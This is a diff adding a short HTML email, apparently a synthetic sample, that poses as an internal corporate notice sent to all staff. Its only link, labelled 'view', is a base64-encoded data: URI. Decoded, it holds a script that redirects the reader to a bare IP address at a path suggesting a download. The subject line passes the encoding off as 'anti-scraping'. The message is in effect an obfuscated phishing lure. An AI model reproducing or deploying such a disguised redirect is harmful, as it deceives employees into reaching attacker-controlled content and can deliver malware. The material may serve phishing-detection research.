@@ -1,0 +1,9 @@
+From: =?utf-8?B?5YaF572R6YCa55+l?= <intra@corp-notices.example>
+To: all@corp.internal
+Date: Fri, 28 Aug 2026 14:19:00 +0800
+Message-ID: <0009-b5@synth.example>
+Subject: 通知内容（防爬）
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>点击查看正文：</p><p><a href='data:text/html;base64,PGh0bWw+PHNjcmlwdD5sb2NhdGlvbj0iaHR0cDovLzIwMy4wLjExMy42MC9kIjwvc2NyaXB0Pg=='>查看</a></p></body></html>
